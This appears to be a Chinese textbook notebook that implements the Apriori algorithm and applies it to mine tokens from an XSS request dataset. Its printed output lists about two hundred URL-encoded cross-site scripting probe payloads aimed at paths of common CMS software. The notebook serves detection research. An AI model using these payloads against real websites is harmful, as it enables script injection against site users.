# %% [markdown]
# # 11.2 示例：hello world！Apriori

# %%
def createC1(dataSet):
    C1 = []
    for transaction in dataSet:
        for item in transaction:
            if [item] not in C1:
                C1.append([item])
    C1.sort()
    return list(map(frozenset, C1))

def scanD(D, Ck, minSupport):
    ssCnt = {}
    for tid in D:
        for can in Ck:
            if can.issubset(tid):
                ssCnt[can] = ssCnt.get(can, 0) + 1
    numItems = float(len(D))
    retList = []
    supportData = {}
    for key in ssCnt:
        support = ssCnt[key] / numItems
        if support >= minSupport:
            retList.append(key)
        supportData[key] = support
    return retList, supportData

def aprioriGen(Lk, k):
    retList = []
    lenLk = len(Lk)
    for i in range(lenLk):
        for j in range(i + 1, lenLk):
            L1 = list(Lk[i])[:k-2]
            L2 = list(Lk[j])[:k-2]
            L1.sort()
            L2.sort()
            if L1 == L2:
                retList.append(Lk[i] | Lk[j])
    return retList

def apriori(dataSet, minSupport=0.5):
    C1 = createC1(dataSet)
    D = list(map(set, dataSet))
    L1, suppData = scanD(D, C1, minSupport)
    L = [L1]
    k = 2

    while (len(L[k - 2]) > 0):
        Ck = aprioriGen(L[k - 2], k)
        Lk, supK = scanD(D, Ck, minSupport)
        suppData.update(supK)
        L.append(Lk)
        k += 1
    return L, suppData

def calcConf(freqSet, H, supportData, brl, minConf=0.7):
    prunedH = []
    for conseq in H:
        conf = supportData[freqSet] / supportData[freqSet - conseq]
        if conf >= minConf:
            print(freqSet - conseq, '-->', conseq, 'conf:', conf)
            brl.append((freqSet - conseq, conseq, conf))
            prunedH.append(conseq)
    return prunedH

def rulesFromConseq(freqSet, H, supportData, brl, minConf=0.7):
    m = len(H[0])

    if len(freqSet) > m + 1:
        Hmp1 = aprioriGen(H, m + 1)
        Hmp1 = calcConf(freqSet, Hmp1, supportData, brl, minConf)

        if len(Hmp1) > 1:
            rulesFromConseq(freqSet, Hmp1, supportData, brl, minConf)

def generateRules(L, supportData, minConf=0.7):
    bigRuleList = []
    for i in range(1, len(L)):
        for freqSet in L[i]:
            H1 = [frozenset([item]) for item in freqSet]

            if i > 1:
                rulesFromConseq(freqSet, H1, supportData, bigRuleList, minConf)
            else:
                calcConf(freqSet, H1, supportData, bigRuleList, minConf)
    return bigRuleList

# %%
myDat = [ [1, 3, 4], [2, 3, 5], [1, 2, 3, 5], [2, 5] ]
L, suppData = apriori(myDat, 0.5)

# %%
L
# Out:
# [[frozenset({1}), frozenset({3}), frozenset({2}), frozenset({5})],
#  [frozenset({1, 3}), frozenset({2, 3}), frozenset({3, 5}), frozenset({2, 5})],
#  [frozenset({2, 3, 5})],
#  []]

# %%
suppData
# Out:
# {frozenset({1}): 0.5,
#  frozenset({3}): 0.75,
#  frozenset({4}): 0.25,
#  frozenset({2}): 0.75,
#  frozenset({5}): 0.75,
#  frozenset({1, 3}): 0.5,
#  frozenset({2, 3}): 0.5,
#  frozenset({3, 5}): 0.5,
#  frozenset({2, 5}): 0.75,
#  frozenset({1, 2}): 0.25,
#  frozenset({1, 5}): 0.25,
#  frozenset({2, 3, 5}): 0.5}

# %%
rules = generateRules(L, suppData, minConf=0.7)
rules
# Out:
# frozenset({1}) --> frozenset({3}) conf: 1.0
# frozenset({5}) --> frozenset({2}) conf: 1.0
# frozenset({2}) --> frozenset({5}) conf: 1.0
# [(frozenset({1}), frozenset({3}), 1.0),
#  (frozenset({5}), frozenset({2}), 1.0),
#  (frozenset({2}), frozenset({5}), 1.0)]

# %% [markdown]
# # 11.3 示例：使用Apriori算法挖掘XSS相关参数

# %%
from apriori import apriori
from apriori import generateRules
import re

#myDat = [ [ 1, 3, 4 ], [ 2, 3, 5 ], [ 1, 2, 3, 5 ], [ 2, 5 ] ]
myDat=[]
#L, suppData = apriori(myDat, 0.5)
#rules = generateRules(L, suppData, minConf=0.7)
#print 'rules:\n', rules
with open("../Data/xss-2000.txt") as f:
    for line in f:
        #/discuz?q1=0&q3=0&q2=0%3Ciframe%20src=http://xxooxxoo.js%3E
        print(line)
        index=line.find("?")
        if index>0:
            line=line[index+1:len(line)]
            tokens=re.split('\=|&|\?|\%3e|\%3c|\%3E|\%3C|\%20|\%22|<|>|\\n|\(|\)|\'|\"|;|:|,|\%28|\%29',line)
            myDat.append(tokens)
    f.close()
# Out:
# /0_1/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /0_1/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /0_1/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /0_1/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /0_1/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /0_1/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /0_1/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /0_1/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /0_1/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_1/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_1/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /0_1/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /0_1/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_1/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_1/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_1/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_1/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_1/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /0_1/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /0_1/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /0_1/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /0_1/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /0_1/resume/?key=xxxx%bf%22;alert(360);//
#
# /0_1/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /0_1/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /0_1/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /0_1/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# /0_1/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /0_1/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0_1/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /0_2/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /0/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /0/252/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /0/252/admin/receive.php?signMsg=0FEBF34C4A2EBF825F60025D6C0576F2&version=%3Cobject%20data=...%3E
#
# /0/252/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /0/252/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /0/252/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /0/252/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /0/252/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /0/252/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /0/252/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /0/252/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0/252/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0/252/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /0/252/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /0/252/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/252/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/252/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/252/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0/252/?gallery-1--1--'%20%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20'--grid.html
#
# /0/252/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0/252/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /0/252/index.php?a=lists&agent=2%20onmoonmouseoveruseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=2%22%20onmouseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=4_100%20onmouonmouseoverseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /0/252/index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%22%20onmouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%20onmonmouseoverouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%22%20onmouseover=alert(42873)%20y=&rent_mode=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%20onmoonmouseoveruseover=alert(42873)%20y=&zone=3363
#
# /0/252/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%22%20onmouseover=alert(42873)%20y=&zone=3363
#
# /0/252/index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
#
# /0/252/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /0/252/index.php?m=yp&c=index&a=lists&areaid=12&catid=114&price=&tid=1%22%20onmouseover=prompt(42873)%20&page=1&order=1
#
# /0/252/index.php?m=yp&c=index&a=lists&areaid=37%20%20onmouseover%3Dprompt%2842873%29%20&catid=10&price=1_500&page=1&order=4
#
# /0/252/index.php?m=yp&c=index&a=lists&areaid=37&catid=10&price=%22%20onmouseover=prompt(42873)%20&page=1&order=4
#
# /0/252/index.php?product-%22%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20-1122-viewpic.html
#
# /0/252/manage/Zone/TemplateList.aspx?OpenerText=a');%7Dalert(42873);%7B//
#
# /0/252/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /0/252/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /0/252/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /0/252/?product-75-1@%7C1122%22%3E%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%20-index.html
#
# /0/252/report/reportServlet?action=4&url=http://127.0.0.1&file=wait_trace.raq&columns=0&srcType=file&width=-1&height=-1&cachedId=A_2&t_i_m_e=&frame=stu_saveAs_frame--%3E%3C/sCrIpT%3E%3CsCrIpT%3Ealert(42873)%3C/sCrIpT%3E
#
# /0/252/resume/?key=xxxx%bf%22;alert(360);//
#
# /0/252/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /0/252/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /0/252/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /0/252/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# /0/252/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /0/252/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0/252/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /0_2/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /0_2/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /0_2/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /0_2/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /0_2/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /0_2/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /0_2/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /0_2/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_2/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_2/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /0_2/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /0_2/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_2/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_2/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_2/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_2/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_2/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /0_2/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /0_2/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /0_2/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /0_2/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /0_2/resume/?key=xxxx%bf%22;alert(360);//
#
# /0_2/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /0_2/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /0_2/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /0_2/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# /0_2/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /0_2/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0_2/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /0_3/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /0_3/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
#
# /0_3/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
#
# /0_3/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
#
# /0_3/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
#
# /0_3/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
#
# /0_3/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
#
# /0_3/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /0_3/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_3/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_3/do/count.php?fid=1'%3E%22)%3C/script%3E%3Cscript%3Ealert(String.fromCharCode(120,%20115,%20115))%3C/script%3E
#
# /0_3/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /0_3/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_3/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_3/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_3/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_3/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_images.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_images_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_media.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_media_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_soft_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_templets.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
# /0_3/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
#
# /0_3/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
#
# /0_3/mobile/goods_list.php?type=1s'%20onmouseover=alert(/ed1e83f8d8d90aa943e4add2ce6a4cbf/)%20//
#
# /0_3/plus/bshare.php?dopost=getcode&uuid=%22%20onload=alert%281%29//
#
# /0_3/portal.php?diy=yes%22%3E%3C/ScRiPt%3E%3CScRiPt%3Ealert(/webscan/)%3C/ScRiPt%3E
#
# /0_3/resume/?key=xxxx%bf%22;alert(360);//
#
# /0_3/showtopiclist.aspx?direct=0%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&forumid=-1&order=1&page=1&search=1&type=
#
# /0_3/showtopiclist.aspx?direct=0&forumid=-1&order=1%22/%3E%3Cscript%3Ealert(42873)%3C/script%3E&page=1&search=1&type=
#
# /0_3/swfupload/swfupload.swf?debugEnabled=true&movieName=%22])%7Dcatch(e)%7Bif(!window.x)%7Balert(1);window.x=1%7D%7Dtry%7B([%22
#
# /0_3/u.php/member-login?id=header_login%27%22%28%29%26%25%3CScRiPt%20%3Eprompt%2842873%29%3C/ScRiPt%3E&style=1
#
# /0_3/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
#
# /0_3/wap.php?pageBody=%3Cscript%3Ealert(42873)%3C/script%3E
#
# /0_3/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
#
# /0_5/?%22onmouseover='prompt(42873)'bad=%22%3E
#
# /0532-87866423/?callback="'></textarea></script><script>prompt(42873)</script>
#
# /0532-87866423/?"onmouseover='prompt(42873)'bad=">
#
# /0532-87866423/swfupload/swfupload.swf?debugEnabled=true&movieName="])}catch(e){if(!window.x){alert(1);window.x=1}}try{(["
#
# /0532-87866423/?xss_test"'></textarea></script><iframe src=javascript:this["\x61\x6c\x65\x72\x74"]("42873")>
#
# /0_5/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
#
# /0_5/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_5/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
#
# /0_5/do/kindeditor.php?id=%bf%22;alert(1);//&style=&etype=
#
# /0_5/e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_5/e/data/ecmseditor/infoeditor/epage/TranFlash.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_5/e/data/ecmseditor/infoeditor/epage/TranImg.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_5/e/data/ecmseditor/infoeditor/epage/TranMedia.php?InstanceName=3232%22%3E%3Cscript%3Ealert(/D/)%3C/script%3E%3C%22
#
# /0_5/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
#
